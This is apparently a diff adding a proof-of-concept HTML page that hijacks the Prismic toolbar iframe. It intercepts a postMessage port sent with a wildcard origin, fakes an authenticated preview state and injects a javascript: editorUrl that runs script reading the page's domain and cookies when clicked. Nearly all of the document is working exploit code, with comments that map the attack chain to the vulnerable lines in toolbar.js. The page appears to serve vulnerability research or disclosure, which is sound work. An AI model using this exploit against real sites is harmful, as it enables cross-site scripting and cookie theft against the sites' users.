@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html>
+<head><title>Prismic Catch</title></head>
+<body>
+<script>
+// Prismic Toolbar Iframe Hijack — Catch Page
+// ============================================
+// This page is navigated INTO the Prismic toolbar iframe via frames[0].location.
+// The parent's prismic.js sends SetupPort + MessagePort with '*' target origin:
+//   e.contentWindow.postMessage('setup_port', '*', [port2])
+// We intercept it and control all subsequent ToolbarClient communication.
+//
+// Chain:
+//   setup_port → port established → preview_state (auth:true) → toolbar renders
+//   → prediction_docs request arrives → we respond with javascript: editorUrl
+//   → toolbar.js:7461 renders <a href="javascript:..."> → XSS on click
+
+const SETUP_PORT = 'setup_port';
+const READY = 'ready';
+
+window.addEventListener('message', function(e) {
+  if (e.data === SETUP_PORT && e.ports && e.ports.length > 0) {
+    const port = e.ports[0];
+
+    // Acknowledge — parent's establishConnection() resolves on 'ready'
+    port.postMessage(READY);
+
+    port.onmessage = function(msg) {
+      const { type, data } = msg.data;
+
+      switch(type) {
+
+        case 'preview_state':
+          // auth:true → enables toolbar UI + prediction handler
+          // preview:null → avoids cookie-based reload loop
+          port.postMessage({
+            type: 'preview_state',
+            data: {
+              auth: true,
+              csrf: 'hijacked',
+              preview: null
+            }
+          });
+          break;
+
+        case 'prediction_docs':
+          // SINK: editorUrl → <a href={t.editorUrl}> in toolbar.js:7461
+          //        t.url    → <a href={t.url}>       in toolbar.js:4626
+          // No protocol validation. No sanitization. javascript: fires on click.
+          port.postMessage({
+            type: 'prediction_docs',
+            data: [
+              {
+                editorUrl: 'javascript:void(document.title="XSS_"+document.domain,alert("XSS\\n\\nDomain: "+document.domain+"\\nCookies: "+document.cookie.substring(0,200)))',
+                uid: 'xss-poc',
+                title: 'Edit this document in Prismic',
+                summary: 'Click to open in the Prismic editor',
+                type: 'page',
+                status: 'draft',
+                singleton: false,
+                isDocumentLink: false,
+                weight: 1,
+                urls: [],
+                queryTotal: 1,
+                updated: Date.now()
+              }
+            ]
+          });
+          break;
+
+        case 'dev_mode_queries_results':
+          port.postMessage({ type: 'dev_mode_queries_results', data: [] });
+          break;
+
+        case 'close_preview_session':
+          port.postMessage({ type: 'close_preview_session', data: null });
+          break;
+
+        case 'track_toolbar_setup':
+          port.postMessage({ type: 'track_toolbar_setup', data: null });
+          break;
+
+        case 'track_document_click':
+          port.postMessage({ type: 'track_document_click', data: null });
+          break;
+
+        case 'update_preview':
+          port.postMessage({ type: 'update_preview', data: { reload: false, ref: null } });
+          break;
+
+        case 'share_preview':
+          port.postMessage({ type: 'share_preview', data: null });
+          break;
+
+        default:
+          port.postMessage({ type: type, data: null });
+      }
+    };
+  }
+});
+</script>
+</body>
+</html>
